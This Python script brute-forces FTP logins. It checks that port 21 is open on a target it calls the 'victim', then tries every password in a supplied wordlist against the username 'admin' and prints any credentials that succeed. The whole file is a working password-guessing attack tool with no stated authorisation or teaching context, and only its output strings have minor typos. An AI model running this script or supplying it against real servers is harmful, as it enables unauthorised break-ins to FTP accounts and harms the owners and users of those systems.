#!/usr/bin/env python3
# Crack FTP Service using wordlists
#Author Yehia Elghaly

import ftplib
import sys
import socket
from colorama import Fore, Back, Style

victim=sys.argv[1]
listfile=sys.argv[2]

def scanner():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    status = sock.connect_ex((victim, 21))
    if status == 0:
        print (Fore.BLUE + "Port is Opne")
        sock.close()
    else:
        print ("Port is Closed")
        sys.exit()

def dictionary(target,listfile):
    try:
        passfile=open(listfile,'r')
        for password in passfile.readlines():
            attackftp(target,password)
    except Exception as f:
        print(f)


def attackftp(target,listfile):
    try:
        ftp=ftplib.FTP(target)
        user = 'admin'
        password=listfile.strip('\r').strip('\n')
        print(Fore.RED + 'Attacking with: '+user+" "+password)
        ftp.login(user,password)
        ftp.quit()
        print(Fore.GREEN + 'Login credentials found: '+user+" "+password)
        return(user,listfile)
    except Exception as f:
        print("Worng credentials.")
        return(None,None)
        
scanner()
dictionary(victim,listfile)